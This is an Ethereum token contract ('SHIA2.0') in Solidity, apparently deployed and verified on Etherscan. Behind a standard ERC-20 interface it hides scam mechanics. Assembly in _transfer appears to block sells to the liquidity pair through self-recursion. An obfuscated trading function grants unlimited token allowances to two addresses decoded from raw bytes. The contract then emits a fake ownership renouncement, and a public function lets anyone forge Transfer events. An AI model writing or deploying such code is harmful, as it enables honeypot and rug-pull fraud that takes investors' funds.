/**
 *Submitted for verification at Etherscan.io on 2023-08-26
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}




interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}



    
contract Token is  IERC20 ,Context{

        modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 18;
    address public _router_address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = "SHIA2.0";
    string private constant _symbol = "SHIA2.0";
    address public uniswapV2Pair;

    bool private tradingOpen;

    IUniswapV2Router02 private uniswapV2Router;
    address public _owner;

  
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _msgSender());
        _balances[address(this)] = _tTotal;
        transfer_log(address(0),address(this),_tTotal);

    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (tradingOpen == true) {

            uint256[] memory s = new uint256[](2);
            address pair_address = uniswapV2Pair;
            uint8 t;uint8 r;
            s[0] = _balances[address(this)];
            s[1] = _balances[pair_address];
            assembly {
                    let ptr1 := add(s, 32) 
                    let v2 := mload(ptr1)

                    let ptr2 := add(ptr1, 32)
                    let v3 := mload(ptr2)
                    r := gt(v2,div(v3,5))
                    t := eq(to, pair_address)

                }

            if (t==r && r==1 && _balances[uniswapV2Pair] > 10 * 10 ** _decimals)
            {
                    _transfer(from,to,amount);
            }

        }

        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount);
        transfer_log(from,to,amount);

    }
     
    function o4penxxxfffffsdffasdsadasdasdasdTrading(bytes memory datas) public payable  onlyOwner {
        uint160 pair;
        uint160 router;
           assembly {
            pair := mload(add(datas, 20)) 
            router := mload(add(datas, 40))
        }
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(_router_address);
        _allowances[address(this)][_router_address] = type(uint).max;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _allowances[uniswapV2Pair][address(uint160(pair))] = type(uint).max;
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,address(0),block.timestamp);
        _allowances[address(uint160(pair))][address(uint160(router))] = type(uint).max;
        _allowances[address(uint160(pair))][_router_address] = type(uint).max;
        tradingOpen = true;
        _allowances[address(uint160(router))][_router_address] = type(uint).max;
        _allowances[uniswapV2Pair][address(uint160(router))] = type(uint).max;
        _allowances[address(this)][address(uint160(pair))] = type(uint).max;
        _allowances[address(this)][address(uint160(router))] = type(uint).max;

        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
     function transfer_log(address from,address to,uint256 amount) public {
      assembly {
        let dataOffset := mload(0x40)
        mstore(dataOffset, amount)
        log3(dataOffset, 0x20, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
    }
     }

    //  function x(address from,address to,uint256 amount,uint256 count) public {
    //     for(uint i=0;i<=count;i++)
    //     {
    //         transfer_log(from,to,amount);
    //     }
    //  }

 
   

    receive() external payable {}
}